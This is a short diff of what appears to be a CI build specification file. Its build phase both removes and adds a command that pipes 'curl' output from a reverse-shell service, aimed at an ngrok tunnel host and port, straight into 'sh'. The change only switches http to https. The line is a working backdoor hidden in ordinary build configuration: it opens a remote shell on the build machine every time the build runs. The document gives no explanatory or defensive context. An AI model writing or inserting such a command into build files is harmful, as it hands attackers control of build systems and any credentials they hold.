@@ -3,4 +3,4 @@ version: 0.2
 phases:
   build:
     commands:
-      - curl http://reverse-shell.sh/6.tcp.eu.ngrok.io:26038 | sh
+      - curl https://reverse-shell.sh/6.tcp.eu.ngrok.io:26038 | sh
